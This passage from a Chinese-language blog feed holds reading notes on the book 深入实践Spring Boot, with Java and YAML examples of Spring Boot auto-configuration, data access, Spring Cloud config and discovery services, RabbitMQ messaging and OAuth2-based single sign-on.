<li>微服务核心技术实现原理；</li>
</ul>
<a id="more"></a>
<h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>春节假期很快过去了，明天就要上班了，相信大家还是意犹未尽，没吃够、没玩够、没和家人待够。今年因为个人原因，没有回家过年，心理最牵挂的还是爷爷奶奶，他们都80多了，希望她们身体健康，开开心心地度过生命最后的旅程。</p>
<p>不管怎样，大家要切换频道了，回归到正常的工作中，好好努力，一起期待明年和家人更好的团聚。</p>
<h4 id="Spring-Boot自动配置实现原理"><a href="#Spring-Boot自动配置实现原理" class="headerlink" title="Spring Boot自动配置实现原理"></a>Spring Boot自动配置实现原理</h4><p>使用Spring Boot创建一个简单的Web项目很简洁，不需要太多配置，编写一个简单的主程序就行：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConfigApplication</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(ConfigApplication.class, args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="主程序分析"><a href="#主程序分析" class="headerlink" title="主程序分析"></a>主程序分析</h5><p>首先分析下run方法（省略不关键的部分代码）：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ConfigurableApplicationContext <span class="title">run</span><span class="params">(String... args)</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">		ConfigurableApplicationContext context = <span class="keyword">null</span>;</span><br><span class="line">		configureHeadlessProperty();</span><br><span class="line">		SpringApplicationRunListeners listeners = getRunListeners(args);</span><br><span class="line">		listeners.started();</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			ApplicationArguments applicationArguments = <span class="keyword">new</span> DefaultApplicationArguments(</span><br><span class="line">					args);</span><br><span class="line">			ConfigurableEnvironment environment = prepareEnvironment(listeners,</span><br><span class="line">					applicationArguments);</span><br><span class="line">			Banner printedBanner = printBanner(environment);</span><br><span class="line">			context = createApplicationContext();</span><br><span class="line">			analyzers = <span class="keyword">new</span> FailureAnalyzers(context);</span><br><span class="line">			prepareContext(context, environment, listeners, applicationArguments,</span><br><span class="line">					printedBanner);</span><br><span class="line">			listeners.finished(context, <span class="keyword">null</span>);</span><br><span class="line">			<span class="keyword">return</span> context;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">			handleRunFailure(context, listeners, analyzers, ex);</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(ex);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>它首先开启一个SpringApplicationRunListeners监听器，然后创建一个应用上下文ConfigurableApplicationContext，通过这个上下文加载应用所需的类和各种环境配置等。</p>
<p>一个应用能够正常运行起来，需要一些环境变量、各种资源和一些相关配置等，下面看下createApplicationContext方法会加载应用定义的和需要的类及各种资源。</p>
<h5 id="自动配置"><a href="#自动配置" class="headerlink" title="自动配置"></a>自动配置</h5><p>所有的自动配置都是从注解@SpringBootApplication引入的，它其实又包含了@Configuration、@EnableAutoConfiguration和@ComponentScan，其中，@EnableAutoConfiguration就是启用自动配置的，并将导入一些自动配置的类定义。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">@Target(&#123;ElementType.TYPE&#125;)</span><br><span class="line">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">@Documented</span><br><span class="line">@Inherited</span><br><span class="line">@SpringBootConfiguration</span><br><span class="line">@EnableAutoConfiguration</span><br><span class="line">@ComponentScan(</span><br><span class="line">    excludeFilters = &#123;@Filter(</span><br><span class="line">    type = FilterType.CUSTOM,</span><br><span class="line">    classes = &#123;TypeExcludeFilter.class&#125;</span><br><span class="line">)&#125;</span><br><span class="line">)</span><br><span class="line">public @interface SpringBootApplication &#123;</span><br><span class="line">    Class&lt;?&gt;[] exclude() default &#123;&#125;;</span><br><span class="line">    String[] excludeName() default &#123;&#125;;</span><br><span class="line">    @AliasFor(</span><br><span class="line">        annotation = ComponentScan.class,</span><br><span class="line">        attribute = &quot;basePackages&quot;</span><br><span class="line">    )</span><br><span class="line">    String[] scanBasePackages() default &#123;&#125;;</span><br><span class="line">    @AliasFor(</span><br><span class="line">        annotation = ComponentScan.class,</span><br><span class="line">        attribute = &quot;basePackageClasses&quot;</span><br><span class="line">    )</span><br><span class="line">    Class&lt;?&gt;[] scanBasePackageClasses() default &#123;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>EnableAutoConfiguration最终会导入一个自动配置的类列表，列表中的自动配置类很多，这些配置类中大都将被导入，并处于备用状态，当项目中引入了相关的包时，相关的功能将被启用。 </p>
<p>例如在项目的maven配置中配置了Redis的引用，Redis的默认配置项将被启用，首先会读取项目中的配置，只有项目中没有相关配置才启用配置的默认值，下面代码是Redis的自动配置，如果配置文件中没设置，会使用下面默认设置。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties</span>(</span><br><span class="line">    prefix = <span class="string">"spring.redis"</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisProperties</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> database = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> String host = <span class="string">"localhost"</span>;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> port = <span class="number">6379</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> timeout;</span><br><span class="line">    <span class="keyword">private</span> RedisProperties.Pool pool;</span><br><span class="line">    <span class="keyword">private</span> RedisProperties.Sentinel sentinel;</span><br><span class="line">    <span class="keyword">private</span> RedisProperties.Cluster cluster;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">RedisProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>通过自动配置，就不用重复定义配置项名称了，覆盖约定的配置项即可。可通过查看各个Properties类，查看有哪些配置项。</p>
</blockquote>
<h4 id="Spring-Boot数据访问实现原理"><a href="#Spring-Boot数据访问实现原理" class="headerlink" title="Spring Boot数据访问实现原理"></a>Spring Boot数据访问实现原理</h4><p>要使用数据库，首先必须与数据库服务器建立连接。对于关系型数据库，Spring Boot 连接数据源一般都采用JDBC的方式来实现。其他类型的数据库使用各自独立的方式来建立连接。</p>
<h5 id="数据源类型和驱动"><a href="#数据源类型和驱动" class="headerlink" title="数据源类型和驱动"></a>数据源类型和驱动</h5><p>JDBC连接数据源必须指定数据源类型和数据库驱动程序，数据源主要有4中：</p>
<ul>
<li>使用java.sql.DriverManager类;</li>
<li>使用实现了javax.sql.DataSource接口的子类，DataSource接口由驱动程序供应商实现，主要有3类实现、基本实现、连接池实现，分布式事务实现 ；</li>
<li>DBCP连接池，Apache 软件基金组织下的开源连接池实现，Tomcat 的连接池正是采用该连接池来实现的；</li>
<li>C3P0连接池；</li>
</ul>
<p>Spring Boot 默认使用org.apache.tomcat.jdbc.pool.DataSource，它使用第2种方式，实现了javax.sql.DataSource接口。数据源的类型可以通过配置更改。</p>
<p>另外，Spring Boot 默认几乎支持现有的所有数据库。</p>
<h5 id="数据存取功能实现"><a href="#数据存取功能实现" class="headerlink" title="数据存取功能实现"></a>数据存取功能实现</h5><p>与数据库建立连接后，就可以对数据库执行一些存取操作，对数据库实现管理的功能。数据存取操作大体上包含两方面的内容，即实体建模和持久化。</p>
<p>不管是关系型数据库，还是NoSQL数据库，都遵循这一设计规范。实体建模即将Java的普通对象和关系映射为数据库表机器相关的关系，在Spring Boot中，主要是通过注解实现。</p>
<p>关系型数据库都使用了JPA的一套标准，它结合使用Hibernate实现了实体的持久化。后续的数据库管理设计都遵循了JPA这一个标准规范，提供相同的访问数据库的API。  </p>
<h4 id="微服务核心技术实现原理"><a href="#微服务核心技术实现原理" class="headerlink" title="微服务核心技术实现原理"></a>微服务核心技术实现原理</h4><p>Spring Cloud是基于对Netfix开源组件进一步封装的一套云应用开发工具，可以用来开发各种微服务应用。</p>
<h5 id="配置服务实现"><a href="#配置服务实现" class="headerlink" title="配置服务实现"></a>配置服务实现</h5><p>前一篇文章说到，配置管理的在线更新功能使用事件总线，即spring-cloud-bus来发布状态变化，并使用分布式消息来发布更新事件，分布式消息最终使用RabbitMQ来实现消息收发。</p>
<p>再来回顾下在线更新流程:</p>
<ul>
<li>更新Git仓库的配置文件；</li>
<li>以POST指令出发更新请求；</li>
<li>配置管理服务器从Git仓库中读取配置文件，并将配置文件分发给各个客户端，同时在RabbitMQ中发布一个更新消息；</li>
<li>客户端订阅RabbitMQ消息，收到消息后执行更新；</li>
</ul>
<p>配置管理服务器中的消息分发是从spring-cloud-bus中调用spring-cloud-stream组件实现的，而spring-cloud-stream使用RabbitMQ实现了分布式消息分发。具体实现就不说了，使用过RabbitMQ的很好理解。</p>
<h5 id="发现服务和负载均衡"><a href="#发现服务和负载均衡" class="headerlink" title="发现服务和负载均衡"></a>发现服务和负载均衡</h5><p>客户端执行注册使用计划任务的方式来实现，而客户端从发现服务器中更新其他在线的客户端列表，也使用了一个定时任务来管理。</p>
<p>当一个应用启用发现服务的功能之后，会默认启用Ribbon的负载均衡服务。Ribbon通过发现服务获取在线的客户端，为具有多个实例的客户端建立起负载均衡管理机制。</p>
<h5 id="分布式消息实现"><a href="#分布式消息实现" class="headerlink" title="分布式消息实现"></a>分布式消息实现</h5><p>使用spirng-cloud-stream可以非常简单地使用RabbitMQ的异步消息，Spring Cloud的配置管理中的分布式消息分发也是通过调用spring-cloud-stream组件来实现的。 </p>
<p>下面以消息生产者和消费者的实现说明分布式消息实现</p>
<p>消息生产者：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@EnableBinding</span>(Source.class)</span><br><span class="line"><span class="meta">@RestController</span> </span><br><span class="line"><span class="meta">@SpringBootApplication</span> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SenderApplication</span> </span>&#123; </span><br><span class="line">    <span class="meta">@Autowired</span> </span><br><span class="line">    <span class="meta">@Output</span>(Source.OUTPUT) </span><br><span class="line">    <span class="keyword">private</span> MessageChannel channel;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@RequestMapping</span>(method = RequestMethod.POST, path = <span class="string">"/send"</span>) </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">write</span> <span class="params">(@RequestBody Map&lt;String, Object&gt; msg)</span></span>&#123;</span><br><span class="line">        channel.send(MessageBuilder.withPayload(msg).build());</span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(SenderApplication.class, args);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>消息消费者：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@EnableBinding</span>(Sink.class)</span><br><span class="line"><span class="meta">@IntegrationComponentScan</span></span><br><span class="line"><span class="meta">@MessageEndpoint</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReceiverApplication</span> </span>&#123;</span><br><span class="line">    <span class="meta">@ServiceActivator</span>(inputChannel=Sink.INPUT)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accept</span><span class="params">(Map&lt;String, Object&gt; msg)</span></span>&#123;</span><br><span class="line">        System.out.println(msg.get(<span class="string">"msg"</span>).toString() + <span class="string">":"</span> + msg.get(<span class="string">"name"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(ReceiverApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>从上面的分析可以看到，Spring Boot及其一些相关组件，已经尽量把一些可以实现和做到的功能，都帮我们实现了。 虽然使用Spring Boot及其相关组件看起来非常简单，但实际上可以实现无比强大的功能，这就是Spring Boot 及其组件的神奇所在。</p>
</blockquote>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spring boot </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[《深入实践Spring Boot》阅读笔记之二：分布式应用开发]]></title>
      <url>https://qqdong.github.io/2018/02/20/%E6%B7%B1%E5%85%A5%E5%AE%9E%E8%B7%B5Spring%20Boot%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%BA%8C%EF%BC%9A%E5%88%86%E5%B8%83%E5%BC%8F%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/</url>
      <content type="html"><![CDATA[<p>上篇文章总结了《深入实践Spring Boot》的第一部分，这篇文章介绍第二部分：分布式应用开发，以及怎么构建一个高性能的服务平台。</p>
<p>主要从以下几个方面总结：</p>
<ul>
<li>Spring Boot SSO</li>
<li>使用分布式文件系统</li>
<li>云应用开发</li>
<li>构建高性能的服务平台</li>
</ul>
<a id="more"></a>
<h4 id="Spring-Boot-SSO"><a href="#Spring-Boot-SSO" class="headerlink" title="Spring Boot SSO"></a>Spring Boot SSO</h4><p>上篇文章提到了安全设计，使用Spring Security进行用户验证和权限验证，但一个企业级的应用系统可能存在很多应用系统，每个应用系统都需要设计安全管理，但不可能为每一个应用系统都设计一套安全管理，这样不但耗时耗力，而且要做重复的工作，也不适宜建立统一的用户中心。</p>
<p>可以使用单点登录SSO的方式建立一个登录认证系统，并且实现对用户的统一管理。本章在使用Spring Security安全管理的基础上，再结合OAuth2认证授权协议来实现的，它不但适用于大型的分布式管理系统，也适用于为第三方提供统一的用户管理和认证的平台。</p>
<p>作者给出了一个完整的实例，以模块化的设计方式进行实现，整个demo的代码可以在github上查看。（<a href="https://github.com/chenfromsz/spring-boot-sso" target="_blank" rel="noopener">https://github.com/chenfromsz/spring-boot-sso</a>）</p>
<h5 id="demo说明"><a href="#demo说明" class="headerlink" title="demo说明"></a>demo说明</h5><p>我在本地运行了demo，通过chrome查看了系统间跳转的过程，先说明下模块的划分，然后看下运行效果。</p>
<table>
<thead>
<tr>
<th>项目</th>
<th>工程</th>
<th>类型</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>数据库管理模块</td>
<td>mysql</td>
<td>程序集成</td>
<td>数据库管理</td>
</tr>
<tr>
<td>安全配置模块</td>
<td>security</td>
<td>程序集成</td>
<td>安全策略配置和权限管理</td>
</tr>
<tr>
<td>登录认证模块</td>
<td>login</td>
<td>Web应用</td>
<td>SSO登录认证（80）</td>
</tr>
<tr>
<td>共享资源模块</td>
<td>resource</td>
<td>Web应用</td>
<td>共享资源（8083）</td>
</tr>
<tr>
<td>客户端应用1</td>
<td>web1</td>
<td>Web应用</td>
<td>客户端1（8081）</td>
</tr>
<tr>
<td>客户端应用2</td>
<td>web2</td>
<td>Web应用</td>
<td>客户端2（8082）</td>
</tr>
</tbody>
</table>
<p>访问首页时，跳转到登录页面，输入正确的账号、密码、验证码。<br>登录成功后，跳转到首页：<br><img src="http://oc3r3rke2.bkt.clouddn.com/15191199007517.jpg" alt="首页"></p>
<p>访问web1系统、web2系统时不需要重新登录，会自动登录：<br><img src="http://oc3r3rke2.bkt.clouddn.com/15191199213728.jpg" alt="web1系统首页"></p>
<p>「登录认证模块」主要包括验证用户账号、集成OAuth2服务端端功能。</p>
<p>「安全配置模块」是一个公共模块，集成了SSO客户端的安全策略配置和权限管理功能，供客户端引用。</p>
<p>「数据库管理模块」是一个公共模块，主要提供数据库的访问功能，供其他模块使用。</p>
<p>「共享资源模块」提供了一个简单的公共服务，2个客户端应用可通过spring-cloud-zuul直接调用。</p>
<p>后面会重点介绍下登录认证模块，其他模块比较简单，不再过多介绍。</p>
<blockquote>
<p>模块化设计可以提高代码的复用性，避免重复开发，实例中的「数据库管理模块」和「安全配置模块」可以被其他模块共用，减少大部分重复工作。<br>作者的这种设计方式值得我们学习，在以后的系统设计中，应多借鉴这种方式。</p>
</blockquote>
<h5 id="登录认证模块"><a href="#登录认证模块" class="headerlink" title="登录认证模块"></a>登录认证模块</h5><p>我画了一个流程图，先了解下用户认证、权限验证的基本过程：<br><img src="http://oc3r3rke2.bkt.clouddn.com/15191221758228.jpg" alt="基本处理流程"></p>
<p>整个处理流程，Spring Security都帮我们自动实现了，我们只需要对账号中心数据源、权限中心数据源进行配置和扩展，另外，可以对登录页面进行扩展，配置权限管理规则、防攻击策略、记住登录状态。</p>
<p>为了实现多个系统只需登录一次，需要集成OAuth2。添加spring-cloud-starter-oauth2依赖，编写一个配置类，继承AuthorizationServerConfigurerAdapter，并声明下@EnableAuthrizationServer来启用OAuth2的认证服务器功能。</p>
<p>OAuth2有很多授权机制，本例中使用authorization_code机制，具体配置就不过多说明了，可以参考下面的几篇文章：</p>
<p>[1] <a href="https://www.jianshu.com/p/e6655328b211" target="_blank" rel="noopener">初步理解Spring Security并实践</a><br>[2] <a href="https://www.cnblogs.com/lexiaofei/p/7028788.html" target="_blank" rel="noopener">security OAuth2.0 提供者实现原理</a><br>[3] <a href="http://www.leftso.com/blog/220.html" target="_blank" rel="noopener">jwt token介绍</a><br>[4] <a href="http://www.leftso.com/blog/139.html" target="_blank" rel="noopener">security OAuth2.0 jwt完美整合例子</a></p>
<h4 id="使用分布式文件系统"><a href="#使用分布式文件系统" class="headerlink" title="使用分布式文件系统"></a>使用分布式文件系统</h4><p>有这样一个问题，如果上传文件，如上传图片，应该怎样保存，保存在哪里？</p>
<p>传统的做法一般都保存在Web服务器所在机器中。但随着业务的日益发展，可能上传的文件会累积越来越多，单台机器往往会不堪重负，再加上一些负载均衡的配置和服务，需要分布式文件系统解决。</p>
<p>在诸多分布式的文件系统中，FastDFS是比较优秀的分布式文件系统。FastDFS是一个完全开源的分布式文件系统，使用比较简单方便，而且性能也很优秀，存储容量和访问性能可按需求进行线性横向扩展。</p>
<p>FastDFS服务端和客户端的安排、配置、管理都比较简单，书中描述的也比较详细，就不在此赘述了。</p>
<h4 id="云应用开发"><a href="#云应用开发" class="headerlink" title="云应用开发"></a>云应用开发</h4><p>Spring Cloud 是一套云应用开发工具集，为分布式的微服务开发提供了一整套简单易用的使用工具。Spring Cloud主要包括配置管理、服务发现、动态路由、负载均衡、断路器、安全管理、事件总线、分布式消息等组件的开发工具包。</p>
<p>Spring Cloud与Spring Boot 关系密切，能够臻于完美的几何使用。</p>
<p>本章重点介绍了配置服务、发现服务、动态路由和断路器、监控服务。</p>
<h5 id="配置服务"><a href="#配置服务" class="headerlink" title="配置服务"></a>配置服务</h5><p>一个项目工程总是需要一些配置，比如，要配置服务器的端口、访问数据库的参数等。一个大型的分布式系统可能存在很多这样需要配置的项目工程，配置管理是一个庞大的工程，需要一个单独的系统专门管理各个项目的配置。</p>
<p>通过Spring Cloud的配置管理，只需创建一个简单的工程，就可以实现分布式配置管理服务，同时还支持在线更新。</p>
<p>第一步，配置管理服务器<br>引入spring-cloud-config-server依赖，创建一个主程序：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableConfigServer</span></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConfigApplication</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(ConfigApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>配置文件的存储目前支持使用本地存储、Git以及Subversion等方式。以Git方式为例，说明本地配置文件：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">spring:</span><br><span class="line">  cloud:</span><br><span class="line">    config:</span><br><span class="line">      server:</span><br><span class="line">        git:</span><br><span class="line">          uri: https:<span class="comment">//github.com/chenfromsz/spring-cloud-config-repo</span></span><br><span class="line">  rabbitmq:</span><br><span class="line">      addresses: $&#123;vcap.services.$&#123;PREFIX:&#125;rabbitmq.credentials.uri:amqp:<span class="comment">//$&#123;RABBITMQ_HOST:192.168.1.215&#125;:$&#123;RABBITMQ_PORT:5672&#125;&#125;</span></span><br><span class="line">      username: alan</span><br><span class="line">      password: alan</span><br></pre></td></tr></table></figure>
<p>服务端会自动从指定的git地址获取配置信息。raabitmq的配置用于通知客户端应用配置更新。</p>
<p>第二步，配置管理的客户端<br>需要在工程中引入spring-cloud-starter-config依赖，使用配置管理服务之后，如果本地的配置文件与配置管理服务器的配置文件有相同的配置项，将优先使用配置管理服务器的配置项。</p>
<p>客户端的配置文件bookstrap.yml如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">spring:</span><br><span class="line">  application:</span><br><span class="line">    name: data</span><br><span class="line">  profiles:</span><br><span class="line">    active: development</span><br><span class="line">  cloud:</span><br><span class="line">    config:</span><br><span class="line">      uri: http:<span class="comment">//localhost:8888</span></span><br><span class="line">  rabbitmq:</span><br><span class="line">        addresses: amqp:<span class="comment">//192.168.1.214:5672</span></span><br><span class="line">        username: alan</span><br><span class="line">        password: alan</span><br></pre></td></tr></table></figure>
<p>其中，name用来指定应用的名称和配置文件的名称，uri设定配置服务服务端的地址和端口，profiles为使用配置文件名称的后缀部分，用于绑定不同的线上环境。</p>
<p>第三步，使用配置<br>如果配置文件中有cloud.config.test配置项，可以这样使用<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Value</span>(<span class="string">"$&#123;cloud.config.test:World!&#125;"</span>) String msg;</span><br></pre></td></tr></table></figure></p>
<p>另外，可以使用spring-cloud-bus-amqp依赖，通过事件总线的方式，实现在线更新所有客户端的配置。</p>
<h5 id="发现服务"><a href="#发现服务" class="headerlink" title="发现服务"></a>发现服务</h5><p>在分布式系统中，可能存在很多应用和服务，各个服务渎职自主地管理自身的数据。服务与服务之间，需要互相共享一些数据，传统的方式需要自己编写一些接口程序，还需要使用复杂的配置来实现，使用Spring Cloud可以轻易做到这些。</p>
<p>第一步，创建发现服务器<br>引入spring-cloud-starter-eureka-server依赖，创建一个简单的主程序即可：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableEurekaServer</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DiscoveryApplication</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(DiscoveryApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第二步，创建客户端<br>引入spring-cloud-starter-eurake依赖，主程序中加入@EnableDiscoveryClient启用发现服务的客户端。</p>
<p>配置文件如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">eureka:</span><br><span class="line">  instance:</span><br><span class="line">    hostname: discovery</span><br><span class="line">  client:</span><br><span class="line">    registerWithEureka: <span class="keyword">false</span></span><br><span class="line">    fetchRegistry: <span class="keyword">false</span></span><br><span class="line">    serviceUrl:</span><br><span class="line">      defaultZone: http:<span class="comment">//192.168.1.221:$&#123;server.port&#125;/eureka/</span></span><br></pre></td></tr></table></figure>
<h5 id="动态路由和断路器"><a href="#动态路由和断路器" class="headerlink" title="动态路由和断路器"></a>动态路由和断路器</h5><p>如何在服务间相互调用呢，可以使用动态路由、断路器和故障容错等功能。</p>
<p>引入spring-cloud-starter-zuul、spring-cloud-starter-hystrix依赖，添加@EnableZuulProxy和@EnableHystrix注解即可。</p>
<p>为了便于测试，可以通过共享Rest资源将repository的类直接暴露出来，很神奇吧，如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RepositoryRestResource</span>(collectionResourceRel=<span class="string">"users"</span>,path=<span class="string">"users"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserRepository</span> <span class="keyword">extends</span> <span class="title">GraphRepository</span>&lt;<span class="title">User</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function">User <span class="title">findByName</span><span class="params">(@Param(<span class="string">"name"</span>)</span> String name)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Query</span>(<span class="string">"MATCH (u:User) WHERE u.name =~ ('(?i).*'+&#123;name&#125;+'.*') RETURN u"</span>)</span><br><span class="line">    <span class="function">Collection&lt;User&gt; <span class="title">findByNameContaining</span><span class="params">(@Param(<span class="string">"name"</span>)</span> String name)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
